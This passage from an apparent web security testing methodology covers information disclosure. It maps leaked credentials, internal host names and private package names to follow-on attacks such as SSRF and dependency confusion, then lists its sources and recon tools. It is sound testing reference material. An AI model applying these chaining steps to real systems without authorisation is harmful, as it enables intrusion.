- INF-015, INF-016, INF-017 → every lane: live credentials (CLD), internal host names (SSR-010, HHI), private
  package names (CSD dependency confusion), old endpoints (BAC-013), parameter names (injection lanes).
- INF-008 (`/server-status` with token-bearing request lines) → INF-011; a listing → INF-002, INF-003.

## Sources

- `kb/reports/disclosure.md` and `kb/reports/all/disclosure.md`: the disclosed reports this chapter is built
  from. The counts by title were computed from `kb/data/index.jsonl`.
- `docs/07-graveyard.md` (the cross-class list this chapter's graveyard extends), `docs/04-evidence-standard.md`
  (redaction at capture), `playbooks/PB-14-incidents.md` (real data seen, working credentials found).
- HexBrain: `get_testing_playbook {"topic":"Information Disclosure"}`,
  `search_reports {"topic":"information disclosure","status":"informative"}`.
- OWASP WSTG: INFO-01 (search engine discovery), INFO-03 (webserver metafiles), INFO-05 (webpage content),
  CONF-04 (old backup and unreferenced files), CONF-05 (admin interfaces), ERRH-01 (error handling), ATHN-06
  (browser cache weaknesses). OWASP API Security Top 10 2023, API3 (excessive data exposure).
- PortSwigger Web Security Academy, Information disclosure vulnerabilities.
- Spring Boot reference, Actuator: endpoint exposure and value sanitisation. Django documentation: `DEBUG` and
  `SafeExceptionReporterFilter`. Laravel documentation: Telescope dashboard authorisation.
- RFC 9111 (HTTP caching: what a shared cache may store, `private`, `no-store`); W3C Referrer Policy.
- GitHub REST API, search endpoints and their rate limits; Wayback CDX server API; Common Crawl index server.
- Tools: `trufflehog` and `gitleaks` (secret scanning, verification off), `exiftool`, `gau` and `waybackurls`,
  `gh`, `jq`, `sqlite3`, Playwright (request capture), `porch-pirate` (Postman public network).
